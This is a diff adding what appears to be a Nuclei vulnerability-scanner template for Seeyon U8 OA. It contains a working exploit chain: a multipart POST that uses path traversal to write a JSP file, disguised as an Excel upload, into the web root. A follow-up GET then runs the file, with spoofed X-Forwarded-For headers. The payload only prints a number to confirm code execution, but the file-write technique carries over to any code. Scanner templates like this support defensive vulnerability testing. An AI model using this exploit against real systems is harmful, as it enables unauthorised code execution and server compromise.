@@ -1,0 +1,58 @@
+id: seeyon-u8-wpsAssistServlet-upload-rce
+
+info:
+  name: seeyon-u8-wpsAssistServlet-upload-rce
+  author: seeyon-u8-wpsAssistServlet-upload-rce
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+requests:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{filename}}.jsp&fileId=2 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+        Connection: close
+        Accept: */*
+        Accept-Encoding: gzip
+        Accept-Language: en
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <%
+          out.println(111*111);
+        %>
+        --{{boundary}}--
+
+
+      - |
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        
+
+
+    extractors:
+      - type: dsl
+        dsl:
+          - trim_space(body_2)
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2,'12321')"
+
